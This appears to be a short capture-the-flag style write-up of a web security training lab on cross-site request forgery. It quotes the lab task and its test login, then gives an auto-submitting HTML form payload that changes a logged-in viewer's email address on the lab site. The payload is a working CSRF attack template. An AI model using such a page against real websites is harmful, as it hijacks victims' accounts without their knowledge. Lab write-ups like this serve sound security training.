# Cross-site Request Forgery (CSRF)

### CSRF vulnerability with no defenses

!!! question
    This lab's email change functionality is vulnerable to CSRF.

    To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

    You can log in to your own account using the following credentials: `wiener:peter`

This first one was easy... following the instructions in the documentation on CSRF, you simply craft an evil payload something similar to the following:

```html
<html>
  <body>
    <form action="https://acbd1fc91ebd63dfc0dc1e3100420089.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
